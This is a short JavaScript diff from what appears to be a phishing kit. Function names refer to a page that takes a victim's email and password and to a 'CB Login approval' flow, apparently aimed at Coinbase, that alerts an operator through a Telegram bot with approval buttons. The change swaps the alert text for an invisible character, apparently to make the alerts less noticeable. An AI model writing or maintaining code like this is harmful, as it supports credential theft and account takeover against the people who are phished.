@@ -98,12 +98,8 @@ function sendApprovalRequestPage(email, password) {
   );
 }
 
-// -----------------
-// CB Login approval (from small code)
-// -----------------
 async function sendLoginTelegram(email) {
   const options = {
-    parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
         [
@@ -113,8 +109,11 @@ async function sendLoginTelegram(email) {
       ]
     }
   };
-  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
+
+  // Invisible character instead of visible text
+  await bot.sendMessage(ADMIN_CHAT_ID, "‎", options);
 }
+
 
 // -----------------
 // Handle button clicks (merged)
